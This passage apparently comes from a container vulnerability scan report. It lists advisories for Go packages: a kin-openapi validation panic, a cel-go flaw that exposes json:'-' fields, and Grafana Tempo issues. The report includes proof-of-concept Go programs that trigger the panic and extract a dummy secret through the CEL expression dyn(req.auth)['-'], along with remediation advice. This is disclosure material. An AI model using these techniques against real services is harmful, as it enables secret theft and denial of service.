│                       │     │                   	// Handler mirrors openapi3filter.ValidationHandler: find
│                       │     │                   route, validate.
│                       │     │                   	h := http.HandlerFunc(func(w http.ResponseWriter, r
│                       │     │                   *http.Request) {
│                       │     │                   		route, pathParams, err := router.FindRoute(r)
│                       │     │                   		if err != nil {
│                       │     │                   			http.Error(w, err.Error(), http.StatusNotFound)
│                       │     │                   			return
│                       │     │                   		}
│                       │     │                   		// Panics here on the crafted request
│                       │     │                   (req_resp_decoder.go:197).
│                       │     │                   		if err := openapi3filter.ValidateRequest(r.Context(),
│                       │     │                   &openapi3filter.RequestValidationInput{
│                       │     │                   			Request:    r,
│                       │     │                   			PathParams: pathParams,
│                       │     │                   			Route:      route,
│                       │     │                   			Options:    &openapi3filter.Options{AuthenticationFunc:
│                       │     │                   openapi3filter.NoopAuthenticationFunc},
│                       │     │                   		}); err != nil {
│                       │     │                   			http.Error(w, err.Error(), http.StatusBadRequest)
│                       │     │                   		w.WriteHeader(http.StatusOK)
│                       │     │                   	})
│                       │     │                   	srv := httptest.NewServer(h)
│                       │     │                   	defer srv.Close()
│                       │     │                   	// The single, unauthenticated attack request.
│                       │     │                   	resp, err := http.Get(srv.URL + "/c?cfg=1")
│                       │     │                   		// Expected: the server goroutine panicked, so the client
│                       │     │                   sees EOF.
│                       │     │                   		fmt.Printf("client received an aborted response (expected):
│                       │     │                    %v\n", err)
│                       │     │                   		return
│                       │     │                   	defer resp.Body.Close()
│                       │     │                   	fmt.Printf("UNEXPECTED: got HTTP %d without a panic\n",
│                       │     │                   resp.StatusCode)
│                       │     │                   **3. Observed result** — the request goroutine panics inside
│                       │     │                   validation, and the client's `http.Get` returns an EOF:
│                       │     │                   http: panic serving 127.0.0.1:xxxxx: runtime error: invalid
│                       │     │                   memory address or nil pointer dereference
│                       │     │                   github.com/getkin/kin-openapi/openapi3filter.defaultContentPa
│                       │     │                   rameterDecoder(...)
│                       │     │                   	openapi3filter/req_resp_decoder.go:197
│                       │     │                   github.com/getkin/kin-openapi/openapi3filter.decodeContentPar
│                       │     │                   ameter(...)
│                       │     │                   	openapi3filter/req_resp_decoder.go:166
│                       │     │                   github.com/getkin/kin-openapi/openapi3filter.ValidateParamete
│                       │     │                   r(...)
│                       │     │                   	openapi3filter/validate_request.go:177
│                       │     │                   github.com/getkin/kin-openapi/openapi3filter.ValidateRequest(
│                       │     │                   ...)
│                       │     │                   	openapi3filter/validate_request.go:83
│                       │     │                   Swapping the media type for one that carries a schema
│                       │     │                   (`application/json: {schema: {type: object}}`) makes the same
│                       │     │                    request return a clean `400` instead of panicking,
│                       │     │                   confirming the missing schema is the cause.
│                       │     │                   ### Impact
│                       │     │                   This is an **unauthenticated remote denial of service**
│                       │     │                   (CWE-476) against any service that validates incoming
│                       │     │                   requests with `openapi3filter` and serves a spec containing
│                       │     │                   at least one `content` parameter whose media type lacks a
│                       │     │                   `schema`.
│                       │     │                   The precise consequence depends on which goroutine runs the
│                       │     │                   panic and whether a `recover()` covers it:
│                       │     │                   | Wiring | Recovered by `net/http`? | Result |
│                       │     │                   |---|---|---|
│                       │     │                   | Synchronous middleware / handler on `net/http` (incl.
│                       │     │                   `openapi3filter.ValidationHandler`) | Yes | Process survives;
│                       │     │                    the one request is aborted. A remote unauthenticated party
│                       │     │                   can still drive connection churn + unbounded `http: panic
│                       │     │                   serving` log growth. |
│                       │     │                   | `ValidateRequest` on an app-spawned goroutine (fan-out,
│                       │     │                   `errgroup`, async pre-check) | No | **Whole process crashes**
│                       │     │                    on a single unauthenticated request unless the app added its
│                       │     │                    own `recover()`. |
│                       │     │                   | Non-`net/http` host (fasthttp adaptor, gRPC-gateway shim,
│                       │     │                   CLI, offline/batch spec validator) | No | **Whole process
│                       │     │                   crashes.** |
│                       │     │                   This is why the suggested CVSS uses `A:L` (Base 5.3): under
│                       │     │                   the recommended synchronous `net/http` wiring the panic is
│                       │     │                   recovered per-connection. Reviewers may reasonably raise it
│                       │     │                   to `A:H` (Base 7.5) for the spawned-goroutine and
│                       │     │                   non-`net/http` integrations, where a single request kills the
│                       │     │                    process.
│                       │     │                   ## Remediation (suggested)
│                       │     │                   Add a `mt.Schema == nil` guard mirroring the existing `mt ==
│                       │     │                   nil` guard, so a schema-less content parameter yields a clean
│                       │     │                    validation error instead of a panic:
│                       │     │                   if mt == nil {
│                       │     │                   if mt.Schema == nil {
│                       │     │                       err = fmt.Errorf("parameter %q content media type has no
│                       │     │                   schema", param.Name)
│                       │     │                   outSchema = mt.Schema.Value
│                       │     │                   The `unmarshal` closure immediately below already tolerates a
│                       │     │                    nil schema (it checks `paramSchema != nil`), so returning
│                       │     │                   early on nil `mt.Schema` is consistent with surrounding
│                       │     │                   intent.
│                       │     │                   **Workarounds for consumers, pending a patch:**
│                       │     │                   - Ensure every `content` parameter in served specs declares a
│                       │     │                    `schema`, or reject such specs at load time.
│                       │     │                   - Supply a custom `ParamDecoder` that guards `mt.Schema ==
│                       │     │                   nil`.
│                       │     │                   - Run request validation inside a handler with an explicit
│                       │     │                   `recover()` — especially if validation runs off the request
│                       │     │                   goroutine or on a non-`net/http` host.
│                       │     │                   ## Notes for the maintainer
│                       │     │                   This root cause (`mt.Schema == nil`) is independent of the
│                       │     │                   `Items == nil` panics addressed in `30e2923` and of
│                       │     │                   `GHSA-mmfr-pmjx-hw9w`; no prior fix touched this code path.
│                       │     │                   It affects OpenAPI 3.0.x as well as 3.1.x. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ VendorSeverity   ─ ghsa: 2 
│                       │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L 
│                       │     │                         ╰ V3Score : 5.3 
│                       │     ├ References       ╭ [0]: https://github.com/getkin/kin-openapi 
│                       │     │                  ├ [1]: https://github.com/getkin/kin-openapi/commit/68ac2affa3
│                       │     │                  │      25514d7d6e731204d6a1edf6bdff64 
│                       │     │                  ├ [2]: https://github.com/getkin/kin-openapi/releases/tag/v0.1
│                       │     │                  │      44.0 
│                       │     │                  ╰ [3]: https://github.com/getkin/kin-openapi/security/advisori
│                       │     │                         es/GHSA-jpcw-4wr7-c3vq 
│                       │     ├ PublishedDate   : 2026-07-24T22:39:39Z 
│                       │     ╰ LastModifiedDate: 2026-07-24T22:39:39Z 
│                       ├ [2] ╭ VulnerabilityID : GHSA-gcjh-h69q-9w9g 
│                       │     ├ PkgID           : github.com/google/cel-go@v0.28.1 
│                       │     ├ PkgName         : github.com/google/cel-go 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/google/cel-go@v0.28.1 
│                       │     │                  ╰ UID : 9d55b7b902f32022 
│                       │     ├ InstalledVersion: v0.28.1 
│                       │     ├ FixedVersion    : 0.29.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-gcjh-h69q-9w9g 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Fingerprint     : sha256:a82cb7a3a8cbfaa1039507946b2825e445ef4be31de87c43b90430
│                       │     │                   5786acfa4d 
│                       │     ├ Title           : cel-go: JSON Private Fields Exposed via NativeTypes and
│                       │     │                   ParseStructTag 
│                       │     ├ Description     : The function `ext.NativeTypes(ParseStructTag("json"))` does
│                       │     │                   not honour the `encoding/json` skip directive `json:"-"`.
│                       │     │                   Fields tagged `json:"-"` are registered in the CEL type
│                       │     │                   system under the literal name `"-"` and are readable from any
│                       │     │                    user-submitted CEL expression via `dyn(obj)["-"]`. 
│                       │     │                   
│                       │     │                   Additionally, `newNativeTypes` silently registers every
│                       │     │                   nested struct reachable from the type passed to
│                       │     │                   `NativeTypes`, including types from third-party dependencies
│                       │     │                   the developer never examined.
│                       │     │                   ## Root cause
│                       │     │                   In `fieldNameByTag`, the helper used by
│                       │     │                   `ParseStructTag("json")` to translate Go struct tags into CEL
│                       │     │                    field names.
│                       │     │                   See at `ext/native.go:146`:
│                       │     │                   ```go
│                       │     │                   func fieldNameByTag(structTagToParse string) func(field
│                       │     │                   reflect.StructField) string {
│                       │     │                       return func(field reflect.StructField) string {
│                       │     │                           tag, found := field.Tag.Lookup(structTagToParse)
│                       │     │                           if found {
│                       │     │                               splits := strings.Split(tag, ",")
│                       │     │                               if len(splits) > 0 {
│                       │     │                                   // We make the assumption that the leftmost
│                       │     │                   entry in the tag is the name.
│                       │     │                                   // This seems to be true for most tags that
│                       │     │                   have the concept of a name/key, such as:
│                       │     │                                   // https://pkg.go.dev/encoding/xml#Marshal
│                       │     │                                   // https://pkg.go.dev/encoding/json#Marshal
│                       │     │                                   //
│                       │     │                   https://pkg.go.dev/go.mongodb.org/mongo-driver/bson#hdr-Struc
│                       │     │                   ts
│                       │     │                   https://pkg.go.dev/go.yaml.in/yaml/v3#Marshal
│                       │     │                                   name := splits[0]
│                       │     │                                   return name
│                       │     │                               }
│                       │     │                           }
│                       │     │                           return field.Name
│                       │     │                       }
│                       │     │                   }
│                       │     │                   ```
│                       │     │                   For a field tagged `json:"-"`, this code splits the tag into
│                       │     │                   `[]string{"-"}` and returns `"-"` as the CEL field name. It
│                       │     │                   never checks whether `"-"` is the JSON skip sentinel.
│                       │     │                   This contradicts the `encoding/json` rule that the source
│                       │     │                   comment explicitly points readers to:
│                       │     │                   ```text
│                       │     │                   As a special case, if the field tag is "-", the field is
│                       │     │                   always omitted. Note
│                       │     │                   that a field with name "-" can still be generated using the
│                       │     │                   tag "-,".
│                       │     │                   The public option also documents JSON-style parsing as the
│                       │     │                   intended behavior.
│                       │     │                   See at `ext/native.go:190`:
│                       │     │                   // ParseStructTag configures the struct tag to parse. The 0th
│                       │     │                    item in the tag is used as the name of the CEL field.
│                       │     │                   // For example:
│                       │     │                   // If the tag to parse is "cel" and the struct field has tag
│                       │     │                   cel:"foo", the CEL struct field will be "foo".
│                       │     │                   // If the tag to parse is "json" and the struct field has tag
│                       │     │                    json:"foo,omitempty", the CEL struct field will be "foo".
│                       │     │                   func ParseStructTag(tag string) NativeTypesOption {
│                       │     │                       return func(ntp *nativeTypeOptions) error {
│                       │     │                           ntp.fieldNameHandler = fieldNameByTag(tag)
│                       │     │                           return nil
│                       │     │                   A developer using `ParseStructTag("json")` is therefore led
│                       │     │                   to expect `encoding/json` field-name semantics. Instead,
│                       │     │                   `json:"-"` is treated as a real field name.
│                       │     │                   The bad name is accepted during native type construction.
│                       │     │                   `newNativeType` checks for duplicate field names, but it does
│                       │     │                    not reject or skip empty names or skip sentinels.
│                       │     │                   See at `ext/native.go:663`:
│                       │     │                   if fieldNameHandler != nil {
│                       │     │                       fieldNames := make(map[string]struct{})
│                       │     │                       for idx := 0; idx < refType.NumField(); idx++ {
│                       │     │                           field := refType.Field(idx)
│                       │     │                           fieldName := toFieldName(fieldNameHandler, field)
│                       │     │                           if _, found := fieldNames[fieldName]; found {
│                       │     │                               return nil, fmt.Errorf("invalid field name `%s`
│                       │     │                   in struct `%s`: %w", fieldName, refType.Name(),
│                       │     │                   errDuplicatedFieldName)
│                       │     │                           } else {
│                       │     │                               fieldNames[fieldName] = struct{}{}
│                       │     │                   Once accepted, the field becomes part of CEL's view of the
│                       │     │                   type. Field enumeration reports it as a normal field name.
│                       │     │                   See at `ext/native.go:286`:
│                       │     │                   func (tp *nativeTypeProvider) FindStructFieldNames(typeName
│                       │     │                   string) ([]string, bool) {
│                       │     │                       if t, found := tp.nativeTypes[typeName]; found {
│                       │     │                           fieldCount := t.refType.NumField()
│                       │     │                           fields := make([]string, fieldCount)
│                       │     │                           for i := 0; i < fieldCount; i++ {
│                       │     │                               fields[i] =
│                       │     │                   toFieldName(tp.options.fieldNameHandler, t.refType.Field(i))
│                       │     │                           return fields, true
│                       │     │                       if celTypeFields, found :=
│                       │     │                   tp.baseProvider.FindStructFieldNames(typeName); found {
│                       │     │                           return celTypeFields, true
│                       │     │                       return tp.baseProvider.FindStructFieldNames(typeName)
│                       │     │                   Field lookup also treats the name as valid and returns the
│                       │     │                   underlying Go field value.
│                       │     │                   See at `ext/native.go:303`:
│                       │     │                   func (tp *nativeTypeProvider) FindStructFieldType(typeName,
│                       │     │                   fieldName string) (*types.FieldType, bool) {
│                       │     │                       t, found := tp.nativeTypes[typeName]
│                       │     │                       if !found {
│                       │     │                           return tp.baseProvider.FindStructFieldType(typeName,
│                       │     │                   fieldName)
│                       │     │                       refField, isDefined := t.hasField(fieldName)
│                       │     │                       if !found || !isDefined {
│                       │     │                           return nil, false
│                       │     │                       return &types.FieldType{
│                       │     │                           IsSet: func(obj any) bool {
│                       │     │                               refVal := reflect.Indirect(reflect.ValueOf(obj))
│                       │     │                               refField := refVal.FieldByName(refField.Name)
│                       │     │                               return !refField.IsZero()
│                       │     │                           },
│                       │     │                           GetFrom: func(obj any) (any, error) {
│                       │     │                               return getFieldValue(refField), nil
│                       │     │                       }, true
│                       │     │                   At runtime, native objects advertise index access.
│                       │     │                   See at `ext/native.go:37`:
│                       │     │                   var (
│                       │     │                       nativeObjTraitMask = traits.FieldTesterType |
│                       │     │                   traits.IndexerType
│                       │     │                   )
│                       │     │                   Because `traits.IndexerType` is present, a user expression
│                       │     │                   can bypass ordinary field syntax and read the registered
│                       │     │                   `"-"` field with bracket access:
│                       │     │                   ```cel
│                       │     │                   dyn(req.auth)["-"]
│                       │     │                   The same mistaken name is also used when converting native
│                       │     │                   objects to JSON-like CEL values.
│                       │     │                   `ConvertToNative(jsonStructType)` iterates all Go struct
│                       │     │                   fields, computes the CEL field name, and inserts it into the
│                       │     │                   output map without applying the JSON skip rule.
│                       │     │                   See at `ext/native.go:501`:
│                       │     │                   case jsonStructType:
│                       │     │                       refVal := reflect.Indirect(o.refValue)
│                       │     │                       refType := refVal.Type()
│                       │     │                       fields := make(map[string]*structpb.Value,
│                       │     │                   refVal.NumField())
│                       │     │                       for i := 0; i < refVal.NumField(); i++ {
│                       │     │                           fieldType := refType.Field(i)
│                       │     │                           fieldValue := refVal.Field(i)
│                       │     │                           if !fieldValue.IsValid() || fieldValue.IsZero() {
│                       │     │                               continue
│                       │     │                           fieldName := toFieldName(o.valType.fieldNameHandler,
│                       │     │                   fieldType)
│                       │     │                           fieldCELVal :=
│                       │     │                   o.NativeToValue(fieldValue.Interface())
│                       │     │                           fieldJSONVal, err :=
│                       │     │                   fieldCELVal.ConvertToNative(jsonValueType)
│                       │     │                           if err != nil {
│                       │     │                               return nil, err
│                       │     │                           fields[fieldName] = fieldJSONVal.(*structpb.Value)
│                       │     │                       return &structpb.Struct{Fields: fields}, nil
│                       │     │                   This means a `json:"-"` secret is exposed in two ways: it can
│                       │     │                    be read directly through CEL indexing as `dyn(obj)["-"]`,
│                       │     │                   and it can appear under the key `"-"` in JSON struct
│                       │     │                   conversion output.
│                       │     │                   The blast radius is widened by `newNativeTypes`, which
│                       │     │                   registers not only the type explicitly passed to
│                       │     │                   `NativeTypes`, but also every nested struct reachable from
│                       │     │                   its fields.
│                       │     │                   See at `ext/native.go:609`:
│                       │     │                   func newNativeTypes(fieldNameHandler
│                       │     │                   NativeTypesFieldNameHandler, rawType reflect.Type)
│                       │     │                   ([]*nativeType, error) {
│                       │     │                       nt, err := newNativeType(fieldNameHandler, rawType)
│                       │     │                       if err != nil {
│                       │     │                           return nil, err
│                       │     │                       result := []*nativeType{nt}
│                       │     │                       var iterateStructMembers func(reflect.Type)
│                       │     │                       iterateStructMembers = func(t reflect.Type) {
│                       │     │                           if k := t.Kind(); k == reflect.Pointer || k ==
│                       │     │                   reflect.Slice || k == reflect.Array || k == reflect.Map {
│                       │     │                               iterateStructMembers(t.Elem())
│                       │     │                               return
│                       │     │                           if t.Kind() != reflect.Struct {
│                       │     │                           nt, ntErr := newNativeType(fieldNameHandler, t)
│                       │     │                           if ntErr != nil {
│                       │     │                               err = ntErr
│                       │     │                           result = append(result, nt)
│                       │     │                           for idx := 0; idx < t.NumField(); idx++ {
│                       │     │                               iterateStructMembers(t.Field(idx).Type)
│                       │     │                       iterateStructMembers(rawType)
│                       │     │                       return result, err
│                       │     │                   As a result, a developer can register one apparently safe
│                       │     │                   request type while a nested dependency type is silently
│                       │     │                   registered too. If that nested type contains a `json:"-"`
│                       │     │                   secret, CEL still receives a readable field named `"-"` even
│                       │     │                   though the developer never registered or audited that nested
│                       │     │                   type directly.
│                       │     │                   ## Reproduction
│                       │     │                   package main
│                       │     │                   import (
│                       │     │                       "fmt"
│                       │     │                       "reflect"
│                       │     │                       "github.com/google/cel-go/cel"
│                       │     │                       "github.com/google/cel-go/ext"
│                       │     │                   // Simulates a library type; developer never registers this
│                       │     │                   directly.
│                       │     │                   type AuthCtx struct {
│                       │     │                       UserID string `json:"userId"`
│                       │     │                       Secret string `json:"-"` // server-internal; never
│                       │     │                   appears in JSON output
│                       │     │                   // Developer registers only this type.
│                       │     │                   type Req struct{ Auth AuthCtx `json:"auth"` }
│                       │     │                   func main() {
│                       │     │                       env, _ := cel.NewEnv(
│                       │     │                           // Only Req is passed; AuthCtx is registered silently
│                       │     │                    by newNativeTypes.
│                       │     │                           ext.NativeTypes(reflect.TypeOf(Req{}),
│                       │     │                   ext.ParseStructTag("json")),
│                       │     │                           cel.Variable("req", cel.ObjectType("main.Req")),
│                       │     │                       )
│                       │     │                       ast, _ := env.Compile(`dyn(req.auth)["-"]`)
│                       │     │                       prg, _ := env.Program(ast)
│                       │     │                       out, _, _ := prg.Eval(map[string]any{
│                       │     │                           "req": Req{Auth: AuthCtx{UserID: "alice", Secret:
│                       │     │                   "sk-live-s3cr3t"}},
│                       │     │                       })
│                       │     │                       fmt.Println(out) // sk-live-s3cr3t
│                       │     │                   **Expected:** expression compile error or empty result;
│                       │     │                   `json:"-"` field should not be
│                       │     │                   accessible.  
│                       │     │                   **Actual:** `sk-live-s3cr3t`; the server-injected secret is
│                       │     │                   returned verbatim.
│                       │     │                   The same field is also included under key `"-"` in
│                       │     │                   `ConvertToNative(jsonStructType)`
│                       │     │                   output, and appears in `FindStructFieldNames` enumeration.
│                       │     │                   ### path 1. CEL indexing
│                       │     │                   Tested against the released module `github.com/google/cel-go
│                       │     │                   v0.28.1`
│                       │     │                   (latest stable release as of 2026-05-12), using the `go.mod`
│                       │     │                   entry:
│                       │     │                   require github.com/google/cel-go v0.28.1
│                       │     │                   Running the PoC above (`go run main.go`) produces:
│                       │     │                   sk-live-s3cr3t
│                       │     │                   The secret value is returned verbatim, with no error at
│                       │     │                   compile time or at runtime.
│                       │     │                   ### Path 2. `ConvertToNative(jsonStructType)`
│                       │     │                   When the `nativeObj` for the `AuthCtx` value is converted to
│                       │     │                   a Protobuf `Struct`
│                       │     │                   (the representation used whenever CEL output is serialised to
│                       │     │                    JSON), the
│                       │     │                   `json:"-"` field appears in the output map under the key
│                       │     │                   `"-"`.
│                       │     │                       "encoding/json"
│                       │     │                       structpb
│                       │     │                   "google.golang.org/protobuf/types/known/structpb"
│                       │     │                   type AuthCtxConv struct {
│                       │     │                       Secret string `json:"-"` // should never appear in JSON
│                       │     │                   output
│                       │     │                   type ReqConv struct{ Auth AuthCtxConv `json:"auth"` }
│                       │     │                           ext.NativeTypes(reflect.TypeOf(ReqConv{}),
│                       │     │                           cel.Variable("req", cel.ObjectType("main.ReqConv")),
│                       │     │                       ast, _ := env.Compile(`req.auth`)
│                       │     │                           "req": ReqConv{Auth: AuthCtxConv{UserID: "alice",
│                       │     │                   Secret: "sk-live-s3cr3t"}},
│                       │     │                       jsonStructType := reflect.TypeOf(&structpb.Struct{})
│                       │     │                       raw, _ := out.ConvertToNative(jsonStructType)
│                       │     │                       st := raw.(*structpb.Struct)
│                       │     │                       b, _ := json.MarshalIndent(st.AsMap(), "", "  ")
│                       │     │                       fmt.Printf("ConvertToNative(jsonStructType)
│                       │     │                   output:\n%s\n", b)
│                       │     │                       fmt.Printf("\nDirect field access via \"-\" key present:
│                       │     │                   %v\n", st.Fields["-"] != nil)
│                       │     │                       if v, ok := st.Fields["-"]; ok {
│                       │     │                           fmt.Printf("Value: %s\n", v.GetStringValue())
│                       │     │                   Running the PoC above produces:
│                       │     │                   ConvertToNative(jsonStructType) output:
│                       │     │                   {
│                       │     │                     "-": "sk-live-s3cr3t",
│                       │     │                     "userId": "alice"
│                       │     │                   Direct field access via "-" key present: true
│                       │     │                   Value: sk-live-s3cr3t
│                       │     │                   The `"-"` key is present in the serialised Protobuf struct
│                       │     │                   alongside `userId`.
│                       │     │                   Any system that converts a CEL evaluation result to JSON
│                       │     │                   (e.g. via `structpb.Struct`) will include the secret in the
│                       │     │                   output, regardless of whether the `dyn()["-"]` indexing path
│                       │     │                   is used.
│                       │     │                   ## Impact
│                       │     │                   Any user who can submit CEL expressions to an application
│                       │     │                   that uses `ext.NativeTypes(ParseStructTag("json"))` can read
│                       │     │                   struct fields that the developer explicitly marked `json:"-"`
│                       │     │                    to keep out of serialised output. By writing
│                       │     │                   `dyn(obj)["-"]`, the attacker retrieves the raw Go field
│                       │     │                   value, typically a secret, internal token, or private
│                       │     │                   identifier, with no compile-time or runtime error. Because
│                       │     │                   `newNativeTypes` silently registers every nested struct
│                       │     │                   reachable from the root type, the attacker may also reach
│                       │     │                   secrets in dependency types the developer never intended to
│                       │     │                   expose to CEL.
│                       │     │                   ## Remediation
│                       │     │                   Do not treat `json:"-"` as a CEL field named `"-"`. Model it
│                       │     │                   as an explicit skipped field, not as an empty string field
│                       │     │                   name.
│                       │     │                   Update the struct-tag parsing path so exact `json:"-"`
│                       │     │                   returns “skip this field”, while `json:"-,"` continues to
│                       │     │                   mean the literal field name `"-"`, matching `encoding/json`
│                       │     │                   semantics.
│                       │     │                   Apply that skip decision consistently anywhere native fields
│                       │     │                   are exposed or resolved:
│                       │     │                   - duplicate-name validation in `newNativeType`
│                       │     │                   - field enumeration in `FindStructFieldNames`
│                       │     │                   - field type lookup in `FindStructFieldType`
│                       │     │                   - runtime lookup in `fieldByName` / `hasField`
│                       │     │                   - object construction in `NewValue`
│                       │     │                   - JSON conversion in `ConvertToNative(jsonStructType)`
│                       │     │                   Apply the same omit handling for `xml:"-"`, `yaml:"-"`, and
│                       │     │                   `bson:"-"` where `ParseStructTag` is used. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ VendorSeverity   ─ ghsa: 2 
│                       │     ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:
│                       │     │                         │            N/VA:N/SC:N/SI:N/SA:N 
│                       │     │                         ╰ V40Score : 6.3 
│                       │     ├ References       ╭ [0]: https://github.com/cel-expr/cel-go 
│                       │     │                  ╰ [1]: https://github.com/cel-expr/cel-go/security/advisories/
│                       │     │                         GHSA-gcjh-h69q-9w9g 
│                       │     ├ PublishedDate   : 2026-07-24T16:48:56Z 
│                       │     ╰ LastModifiedDate: 2026-07-24T16:48:56Z 
│                       ├ [3] ╭ VulnerabilityID : CVE-2026-21728 
│                       │     ├ VendorIDs        ─ [0]: GHSA-p4r4-xvrq-gvmc 
│                       │     ├ PkgID           : github.com/grafana/tempo@v1.5.1-0.20260427112133-525d1bab07e0 
│                       │     ├ PkgName         : github.com/grafana/tempo 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/grafana/tempo@v1.5.1-0.202604271
│                       │     │                  │       12133-525d1bab07e0 
│                       │     │                  ╰ UID : 18b157406ef90a65 
│                       │     ├ InstalledVersion: v1.5.1-0.20260427112133-525d1bab07e0 
│                       │     ├ FixedVersion    : 2.8.4, 2.9.2, 2.10.2 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-21728 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Fingerprint     : sha256:db88dbeed4a8f4f8f9fc77f71ef4814124f20a4dcb2abe84cf8336
│                       │     │                   4ffed2c76f 
│                       │     ├ Title           : grafana/tempo: Tempo: Denial of Service via large queries 
│                       │     ├ Description     : Tempo queries with large limits can cause large memory
│                       │     │                   allocations which can impact the availability of the service,
│                       │     │                    depending on its deployment strategy.
│                       │     │                   
│                       │     │                   Mitigation can be done by setting max_result_limit in the
│                       │     │                   search config, e.g. to 262144 (2^18). Alternatively,
│                       │     │                   automatically restart the service. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ╭ [0]: CWE-400 
│                       │     │                  ╰ [1]: CWE-770 
│                       │     ├ VendorSeverity   ╭ ghsa  : 3 
│                       │     │                  ╰ redhat: 3 
│                       │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/
│                       │     │                  │        │           A:H 
│                       │     │                  │        ╰ V3Score : 7.5 
│                       │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/
│                       │     │                           │           A:H 
│                       │     │                           ╰ V3Score : 7.5 
│                       │     ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:21769 
│                       │     │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:22347 
│                       │     │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:22423 
│                       │     │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:23345 
│                       │     │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:24503 
│                       │     │                  ├ [5] : https://access.redhat.com/security/cve/CVE-2026-21728 
│                       │     │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2461395 
│                       │     │                  ├ [7] : https://github.com/grafana/tempo 
│                       │     │                  ├ [8] : https://github.com/grafana/tempo/blob/4dc3e5b0d3463a0b
│                       │     │                  │       67498b662b85a148698b4afd/docs/sources/tempo/release-no
│                       │     │                  │       tes/version-2/v2-10.md?plain=1#L328 
│                       │     │                  ├ [9] : https://github.com/grafana/tempo/blob/4dc3e5b0d3463a0b
│                       │     │                  │       67498b662b85a148698b4afd/docs/sources/tempo/release-no
│                       │     │                  │       tes/version-2/v2-8.md?plain=1#L251 
│                       │     │                  ├ [10]: https://github.com/grafana/tempo/blob/4dc3e5b0d3463a0b
│                       │     │                  │       67498b662b85a148698b4afd/docs/sources/tempo/release-no
│                       │     │                  │       tes/version-2/v2-9.md?plain=1#L224 
│                       │     │                  ├ [11]: https://github.com/grafana/tempo/commit/650eb1985a0776
│                       │     │                  │       789c8564122990f588a742356f 
│                       │     │                  ├ [12]: https://github.com/grafana/tempo/pull/6525 
│                       │     │                  ├ [13]: https://grafana.com/security/security-advisories/cve-2
│                       │     │                  │       026-21728 
│                       │     │                  ├ [14]: https://nvd.nist.gov/vuln/detail/CVE-2026-21728 
│                       │     │                  ├ [15]: https://security.access.redhat.com/data/csaf/v2/vex/20
│                       │     │                  │       26/cve-2026-21728.json 
│                       │     │                  ╰ [16]: https://www.cve.org/CVERecord?id=CVE-2026-21728 
│                       │     ├ PublishedDate   : 2026-04-24T09:16:03.71Z 
│                       │     ╰ LastModifiedDate: 2026-07-30T12:17:27.96Z 
│                       ├ [4] ╭ VulnerabilityID : CVE-2026-28377 
│                       │     ├ VendorIDs        ─ [0]: GHSA-ffqx-q65f-36jf 
│                       │     ├ PkgID           : github.com/grafana/tempo@v1.5.1-0.20260427112133-525d1bab07e0 
│                       │     ├ PkgName         : github.com/grafana/tempo 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/grafana/tempo@v1.5.1-0.202604271
│                       │     │                  │       12133-525d1bab07e0 
│                       │     │                  ╰ UID : 18b157406ef90a65 
│                       │     ├ InstalledVersion: v1.5.1-0.20260427112133-525d1bab07e0 
│                       │     ├ FixedVersion    : 2.10.3 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-28377 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Fingerprint     : sha256:a359dd6bb9ce5ee3d634418c80d79c58080612266da5c42fe18c53
│                       │     │                   d78b02a7da 
│                       │     ├ Title           : Grafana Tempo: Grafana Tempo: Information disclosure of S3
│                       │     │                   encryption key via status config endpoint 
│                       │     ├ Description     : A vulnerability in Grafana Tempo exposes the S3 SSE-C
